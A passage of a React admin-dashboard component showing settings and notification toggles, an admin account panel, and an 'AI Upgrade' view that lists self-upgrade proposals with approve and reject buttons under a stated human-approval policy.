                        style={{ background: t.on ? t.color : '#d1d5db' }}>
                        <div className="absolute top-1 w-4 h-4 bg-white rounded-full shadow transition-all"
                          style={{ left: t.on ? '23px' : '4px' }}/>
                      </button>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-white rounded-xl shadow p-6 border border-purple-100">
                <h3 className="text-base font-bold text-gray-900 mb-4">🔔 Notifications</h3>
                <div className="space-y-4">
                  {notifToggles.map(t => (
                    <div key={t.key} className="flex items-center justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        <div className="text-sm font-semibold text-gray-800">{t.label}</div>
                        <div className="text-xs text-gray-500">{t.desc}</div>
                      </div>
                      <button
                        onClick={() => { setNotifToggles(prev => prev.map(x => x.key===t.key ? {...x, on:!x.on} : x)); showSettingsToast(`${t.label} ${t.on ? 'disabled' : 'enabled'}`); }}
                        className="relative w-11 h-6 rounded-full transition-colors flex-shrink-0"
                        style={{ background: t.on ? t.color : '#d1d5db' }}>
                        <div className="absolute top-1 w-4 h-4 bg-white rounded-full shadow transition-all"
                          style={{ left: t.on ? '23px' : '4px' }}/>
                      </button>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-white rounded-xl shadow p-6 border border-purple-100">
                <h3 className="text-base font-bold text-gray-900 mb-4">👤 Admin Account</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                  {[
                    { label:'Admin Email', value:adminEmail },
                    { label:'Organisation ID', value:organizationId },
                    { label:'Software Version', value:'v4.7.2-neural' },
                    { label:'License', value:'Enterprise · Active', highlight:true },
                  ].map(f => (
                    <div key={f.label}>
                      <div className="text-gray-500 mb-1">{f.label}</div>
                      <div className={`font-mono px-3 py-2 rounded-lg border text-sm ${f.highlight ? 'bg-green-50 text-green-700 border-green-200' : 'bg-gray-50 text-gray-900 border-gray-200'}`}>
                        {f.value}
                      </div>
                    </div>
                  ))}
                </div>
                <div className="mt-4 pt-4 border-t border-gray-100 flex gap-2 flex-wrap">
                  <button onClick={() => showSettingsToast('Password reset email sent')}
                    className="px-4 py-2 bg-purple-100 text-purple-700 rounded-lg text-sm font-semibold hover:bg-purple-200 transition-colors">
                    🔑 Change Password
                  </button>
                  <button onClick={() => showSettingsToast('API key regenerated')}
                    className="px-4 py-2 bg-blue-100 text-blue-700 rounded-lg text-sm font-semibold hover:bg-blue-200 transition-colors">
                    🔄 Regenerate API Key
                  </button>
                  <button onClick={() => { if(window.confirm('Export all data?')) showSettingsToast('Data export queued'); }}
                    className="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg text-sm font-semibold hover:bg-gray-200 transition-colors">
                    📦 Export Data
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* AI UPGRADE VIEW */}
          {currentView === 'ai-upgrade' && (
            <div className="space-y-6">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                {[
                  { label:'Pending Review', value: upgrades.filter(u=>u.status==='pending').length, color:'text-yellow-600', bg:'bg-yellow-50' },
                  { label:'Applied', value: upgrades.filter(u=>u.status==='applied').length, color:'text-green-600', bg:'bg-green-50' },
                  { label:'Rejected', value: upgrades.filter(u=>u.status==='rejected').length, color:'text-red-600', bg:'bg-red-50' },
                  { label:'Total Learned', value: upgrades.length, color:'text-purple-600', bg:'bg-purple-50' },
                ].map(s => (
                  <div key={s.label} className={`${s.bg} rounded-xl p-4 text-center`}>
                    <p className="text-xs text-gray-500 mb-1">{s.label}</p>
                    <p className={`text-3xl font-bold ${s.color}`}>{s.value}</p>
                  </div>
                ))}
              </div>

              <div className="bg-gradient-to-r from-purple-900 to-indigo-900 rounded-xl p-6 text-white">
                <div className="flex items-start justify-between gap-4 flex-wrap">
                  <div>
                    <h3 className="text-lg font-bold mb-1">🧠 AI Environment Scanner</h3>
                    <p className="text-purple-200 text-sm">
                      Software B continuously learns from the target environment and proposes self-upgrades.
                      All upgrades require your explicit approval before being applied.
                    </p>
                  </div>
                  <button onClick={handleRescan} disabled={scanning}
                    className="flex-shrink-0 px-5 py-2.5 bg-white text-purple-700 rounded-lg font-bold text-sm hover:bg-purple-50 disabled:opacity-60 transition-colors">
                    {scanning ? `Scanning… ${scanProgress}%` : '🔍 Rescan Environment'}
                  </button>
                </div>
                {scanning && (
                  <div className="mt-4">
                    <div className="w-full bg-purple-800 rounded-full h-2">
                      <div className="bg-purple-300 h-2 rounded-full transition-all" style={{ width:`${scanProgress}%` }}/>
                    </div>
                    <p className="text-xs text-purple-300 mt-1">Analysing OS, processes, network topology…</p>
                  </div>
                )}
              </div>

              <div className="space-y-4">
                {upgrades.map(u => {
                  const impactColor =
                    u.impact==='critical' ? 'bg-red-100 text-red-800' :
                    u.impact==='high'     ? 'bg-orange-100 text-orange-800' :
                    u.impact==='medium'   ? 'bg-yellow-100 text-yellow-800' :
                                           'bg-gray-100 text-gray-700';
                  const statusColor =
                    u.status==='applied'   ? 'bg-green-100 text-green-800' :
                    u.status==='rejected'  ? 'bg-red-100 text-red-800' :
                    u.status==='applying'  ? 'bg-blue-100 text-blue-800' :
                                            'bg-yellow-100 text-yellow-800';

                  return (
                    <div key={u.id} className={`bg-white rounded-xl shadow p-5 border-l-4 ${
                      u.status==='applied'  ? 'border-green-400' :
                      u.status==='rejected' ? 'border-red-300' :
                      u.status==='applying' ? 'border-blue-400' :
                                             'border-purple-400'}`}>
                      <div className="flex items-start gap-4">
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap mb-2">
                            <span className="text-xs font-mono bg-gray-100 text-gray-600 px-2 py-0.5 rounded">{u.category}</span>
                            <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${impactColor}`}>{u.impact} impact</span>
                            <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${statusColor}`}>
                              {u.status==='applying' ? '⏳ Applying…' : u.status}
                            </span>
                          </div>
                          <h4 className="font-bold text-gray-900 mb-1">{u.title}</h4>
                          <p className="text-sm text-gray-600 mb-2">{u.description}</p>
                          <div className="flex items-start gap-2 text-xs text-gray-500 bg-gray-50 rounded-lg p-2">
                            <span className="flex-shrink-0">💡</span>
                            <span><strong>Learned:</strong> {u.learned}</span>
                          </div>
                        </div>
                        {u.status === 'pending' && (
                          <div className="flex flex-col gap-2 flex-shrink-0">
                            <button onClick={() => handleApprove(u.id)}
                              className="px-4 py-2 bg-green-600 text-white rounded-lg font-bold text-sm hover:bg-green-700 transition-colors whitespace-nowrap">
                              ✓ Approve &amp; Apply
                            </button>
                            <button onClick={() => handleReject(u.id)}
                              className="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg font-bold text-sm hover:bg-gray-200 transition-colors">
                              ✕ Reject
                            </button>
                          </div>
                        )}
                        {u.status === 'applying' && <div className="flex-shrink-0 text-blue-600 text-2xl animate-spin">⏳</div>}
                        {u.status === 'applied'  && <div className="flex-shrink-0 text-green-600 text-2xl">✅</div>}
                        {u.status === 'rejected' && <div className="flex-shrink-0 text-red-400 text-2xl">✕</div>}
                      </div>
                    </div>
                  );
                })}
              </div>

              <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-sm text-amber-800">
                <strong>🔒 Human-in-the-Loop Policy:</strong> All AI-proposed upgrades are staged and require explicit admin approval.
                No changes are applied automatically. Rejected upgrades are logged and will not be re-proposed for 7 days.
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};
